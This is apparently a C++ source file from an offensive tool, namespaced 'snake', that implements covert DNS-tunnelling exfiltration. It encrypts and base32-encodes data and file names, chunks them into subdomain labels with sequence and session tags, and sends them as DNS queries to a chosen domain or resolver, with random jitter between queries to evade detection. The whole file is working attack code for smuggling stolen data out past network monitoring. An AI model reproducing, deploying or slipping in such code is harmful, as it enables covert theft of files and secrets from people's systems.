#include "snake/dns.hpp"

#if defined(_WIN32)
#include <winsock2.h>
#include <ws2tcpip.h>
#else
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <poll.h>
#include <sys/socket.h>
#include <unistd.h>
#endif

#include <chrono>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <random>
#include <thread>

#include "snake/sys.hpp"

namespace snake::dns {

namespace {

std::mt19937& rng() {
    static thread_local std::mt19937 g([] {
        std::random_device rd;
        return std::mt19937(rd());
    }());
    return g;
}

void system_resolve(const std::string& query) {
    sys::net_init();
    struct addrinfo hints;
    std::memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    struct addrinfo* res = nullptr;
    if (getaddrinfo(query.c_str(), nullptr, &hints, &res) == 0 && res) {
        freeaddrinfo(res);
    }
}

bool parse_addr(const std::string& s, std::string& host, uint16_t& port) {
    auto pos = s.rfind(':');
    if (pos == std::string::npos) return false;
    host = s.substr(0, pos);
    long p = std::strtol(s.substr(pos + 1).c_str(), nullptr, 10);
    if (p <= 0 || p > 65535) return false;
    port = (uint16_t)p;
    return true;
}

void udp_resolve(const std::string& query, const std::string& resolver) {
    std::string host;
    uint16_t port = 0;
    if (!parse_addr(resolver, host, port)) return;
    sys::net_init();

    Bytes pkt;
    pkt.push_back(0x12);
    pkt.push_back(0x34);
    pkt.push_back(0x01);
    pkt.push_back(0x00);
    pkt.push_back(0x00);
    pkt.push_back(0x01);
    for (int i = 0; i < 6; i++) pkt.push_back(0x00);

    size_t start = 0;
    while (start <= query.size()) {
        size_t dot = query.find('.', start);
        std::string label =
            (dot == std::string::npos) ? query.substr(start) : query.substr(start, dot - start);
        if (label.size() > 63) return;
        if (!label.empty()) {
            pkt.push_back((uint8_t)label.size());
            pkt.insert(pkt.end(), label.begin(), label.end());
        }
        if (dot == std::string::npos) break;
        start = dot + 1;
    }
    pkt.push_back(0x00);
    pkt.push_back(0x00);
    pkt.push_back(0x01);
    pkt.push_back(0x00);
    pkt.push_back(0x01);

    rr_socket_t fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == sys::kInvalidSocket) return;
    struct sockaddr_in sa;
    std::memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    if (inet_pton(AF_INET, host.c_str(), &sa.sin_addr) != 1) {
        sys::close_socket(fd);
        return;
    }
    sendto(fd, (const char*)pkt.data(), (int)pkt.size(), 0, (struct sockaddr*)&sa, (int)sizeof(sa));
    if (sys::wait_readable(fd, 800) > 0) {
        uint8_t buf[1024];
        recv(fd, (char*)buf, (int)sizeof(buf), 0);
    }
    sys::close_socket(fd);
}

void resolve_one(const std::string& query, const ExfilOptions& opts) {
    if (!opts.resolver.empty()) {
        udp_resolve(query, opts.resolver);
    } else {
        system_resolve(query);
    }
}

}  // namespace

std::string b32_encode(const Bytes& d) {
    static const char* A = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
    std::string out;
    int buffer = 0, bits = 0;
    for (uint8_t c : d) {
        buffer = (buffer << 8) | c;
        bits += 8;
        while (bits >= 5) {
            bits -= 5;
            out.push_back(A[(buffer >> bits) & 31]);
        }
    }
    if (bits > 0) out.push_back(A[(buffer << (5 - bits)) & 31]);
    return out;
}

std::vector<std::string> build_queries(const Bytes& key, const Bytes& data,
                                       const std::string& filename, const std::string& domain,
                                       std::string* session_out) {
    std::vector<std::string> out;

    auto encrypted = aead_encrypt(key, data);
    std::string encoded = b32_encode(encrypted);

    auto ns = std::chrono::duration_cast<std::chrono::nanoseconds>(
                  std::chrono::system_clock::now().time_since_epoch())
                  .count();
    char sbuf[32];
    std::snprintf(sbuf, sizeof(sbuf), "%llx", (unsigned long long)ns);
    std::string session = std::string(sbuf);
    if (session.size() > 8) session = session.substr(0, 8);
    if (session_out) *session_out = session;

    std::string tag = "data";
    if (!filename.empty()) {
        tag = b32_encode(Bytes(filename.begin(), filename.end()));
        if (tag.size() > 20) tag = tag.substr(0, 20);
    }

    std::vector<std::string> chunks;
    for (size_t i = 0; i < encoded.size(); i += 60) {
        chunks.push_back(encoded.substr(i, 60));
    }

    for (size_t i = 0; i < chunks.size(); i++) {
        char seq[16];
        std::snprintf(seq, sizeof(seq), "v%04x", (unsigned)i);
        std::string q = std::string(seq) + "." + chunks[i] + "." + tag + "." + session + "." + domain;
        if (q.size() > 253) {
            size_t j = 0;
            for (size_t k = 0; k < chunks[i].size(); k += 40, ++j) {
                std::string sub = chunks[i].substr(k, 40);
                char subseq[24];
                std::snprintf(subseq, sizeof(subseq), "v%04xs%02x", (unsigned)i, (unsigned)j);
                out.push_back(std::string(subseq) + "." + sub + "." + tag + "." + session + "." +
                              domain);
            }
        } else {
            out.push_back(q);
        }
    }
    return out;
}

bool exfiltrate(const Bytes& key, const Bytes& data, const std::string& filename,
                const ExfilOptions& opts) {
    if (opts.domain.empty()) return false;
    auto queries = build_queries(key, data, filename, opts.domain, nullptr);
    if (queries.empty()) return false;

    if (opts.dry_run) {
        if (opts.captured) *opts.captured = queries;
        return true;
    }

    std::uniform_int_distribution<int> short_jit(100, 300);
    std::uniform_int_distribution<int> long_jit(300, 1000);
    for (size_t i = 0; i < queries.size(); i++) {
        resolve_one(queries[i], opts);
        if (i + 1 < queries.size()) {
            std::this_thread::sleep_for(std::chrono::milliseconds(short_jit(rng())));
            if (queries.size() > 2) {
                std::this_thread::sleep_for(std::chrono::milliseconds(long_jit(rng())));
            }
        }
    }
    return true;
}

}  // namespace snake::dns
